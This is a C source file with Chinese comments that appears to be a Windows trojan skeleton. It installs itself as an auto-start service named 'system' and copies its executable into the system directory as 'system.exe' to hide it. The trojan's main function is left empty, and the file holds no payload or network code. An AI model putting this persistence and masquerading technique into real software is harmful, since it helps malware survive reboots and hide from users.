#include<stdio.h>
#include<winsock2.h>
#pragma comment(lib, "ws2_32.lib")
void WINAPI ServiceMain(DWORD, LPTSTR *);
void WINAPI ServiceCtrlHandler(DWORD Opcode);
BOOL InstallCmdService();
void DelServices();
void door();
SERVICE_STATUS m_ServiceStatus;
SERVICE_STATUS_HANDLE m_ServiceStatusHandle;
BOOL bRunning = true;
int main(int argc, char * argv[])
{
	SERVICE_TABLE_ENTRY DispatchTable[] = 
	{
		{"system", ServiceMain},
		{NULL, NULL}
	};
	if(argc == 2)
	{
		if(!stricmp(argv[1], "-1"))//如果第二个参数等于-install
		{
			InstallCmdService();
		 } 
		else if(!stricmp(argv[1], "-r"))
		{
			DelServices();
		 } 
		return 0; 
	}
	StartServiceCtrlDispatcher(DispatchTable);//把入口点的地址传入
	return 0; 
}
void door()
{
//木马主程序入口 

}
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR *lpArgv)//服务主程序 
{	//初始化服务，正在开始 
	m_ServiceStatus.dwServiceType = SERVICE_WIN32;
	m_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
	//服务可以接受的请求，这里我们只接受停止服务请求和暂停恢复请求 
	m_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_PAUSE_CONTINUE;;
	m_ServiceStatus.dwWin32ExitCode = 0;
	m_ServiceStatus.dwServiceSpecificExitCode = 0;
	m_ServiceStatus.dwCheckPoint = 0;
	m_ServiceStatus.dwWaitHint = 0;
	m_ServiceStatusHandle = RegisterServiceCtrlHandler("system", ServiceCtrlHandler);
	//ServiceCtrlHandler服务控制函数，被用来开始、恢复、暂停、停止服务等控制操作 
	if(m_ServiceStatusHandle == (SERVICE_STATUS_HANDLE)0)return;
	//设置服务状态
	m_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
	m_ServiceStatus.dwCheckPoint = 0;
	m_ServiceStatus.dwWaitHint = 0;
	//必须调用ServiceStatus()来响应服务控制程序每次的请求通知，ServiceStatus结构含有7个成员，他们反应服务的现行状态
	//所有的成员须在结构被传递到SetServiceStatus之前正确设置 
	if(SetServiceStatus (m_ServiceStatusHandle, &m_ServiceStatus))
		bRunning = true;
		door();  //启动我们的服务 
		return; 
}
//服务控制函数
void WINAPI ServiceCtrlHandler(DWORD Opcode)
{
	switch(Opcode)
	{
		case SERVICE_CONTROL_PAUSE:   //使用pause命令终止服务
			m_ServiceStatus.dwCurrentState = SERVICE_PAUSED;
		 	break;
		case SERVICE_CONTROL_CONTINUE:  //使用continue命令继续服务
			m_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
			break;
		case SERVICE_CONTROL_STOP:   //使用stop停止服务 
			m_ServiceStatus.dwWin32ExitCode = 0; 
			m_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
			m_ServiceStatus.dwCheckPoint = 0;
			m_ServiceStatus.dwWaitHint = 0;
			SetServiceStatus (m_ServiceStatusHandle, &m_ServiceStatus);
			bRunning = false;
			break;
		case SERVICE_CONTROL_INTERROGATE:
			break;
			
	}
	return;
 } 

//安装服务函数
BOOL InstallCmdService()
{
	char strDir[1024];
	SC_HANDLE schSCManager, schService;
	GetCurrentDirectory(1024, strDir);
	GetModuleFileName(NULL, strDir, sizeof(strDir));
	char chSysPath[1024];
	GetSystemDirectory(chSysPath,sizeof(chSysPath));
	strcat(chSysPath,"\\system.exe");
	if(CopyFile(strDir,chSysPath,FALSE)) //把服务程序复制到系统根目录，便于隐藏 
		printf("Copy file OK\n");
	strcpy(strDir,chSysPath);
	schSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
	if(schSCManager == NULL)
	{
		printf("open scmanager failed, maybe you do not have the privilege to do this\n");
		return false; 
	 } 
	LPCTSTR lpszBinaryPathName = strDir;
	//将服务信息添加到SCM的数据库，服务名为system，显示服务名为system
	schService = CreateService(schSCManager, "system", 
	"system",  //将服务的信息添加到SCM的数据库中
	SERVICE_ALL_ACCESS,  //访问权限
	SERVICE_WIN32_OWN_PROCESS,  //服务类型
	SERVICE_AUTO_START,   //启动类型
	SERVICE_ERROR_NORMAL,   //错误控制类型
	lpszBinaryPathName,   //服务名
	NULL,
	NULL,
	NULL,
	NULL,
	NULL 
	);
	if(schService)
		printf("Install Service Success!\n");
	else
		return false;
	CloseServiceHandle(schService);
	return true;
 } 
//删除服务函数
void DelServices()
{
	char name[100];
	SC_HANDLE scm;
	SC_HANDLE service;
	SERVICE_STATUS status;
	strcpy(name, "system");
	if((scm = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE)) == NULL)
	{
		printf("OpenSCManager Error");
	}
	service = OpenService(scm, name, SERVICE_ALL_ACCESS | DELETE);
	if(!service)
	{
		printf("OpenService error!");
		return;
	}
	BOOL isSuccess = QueryServiceStatus(service, &status);
	if(!isSuccess)
	{
		printf("QueryServiceStatus error!");
		return;
	}
	if(status.dwCurrentState != SERVICE_STOPPED)
	{
		isSuccess = ControlService(service, SERVICE_CONTROL_STOP, &status);
		if(!isSuccess)
			printf("Stop Service error!");
		Sleep(500);
	}
	isSuccess = DeleteService(service);
	if(!isSuccess)
		printf("Delete Service Fail!");
	else
		printf("Delete Service Success!");
	CloseServiceHandle(service);
	CloseServiceHandle(scm);
 } 













 
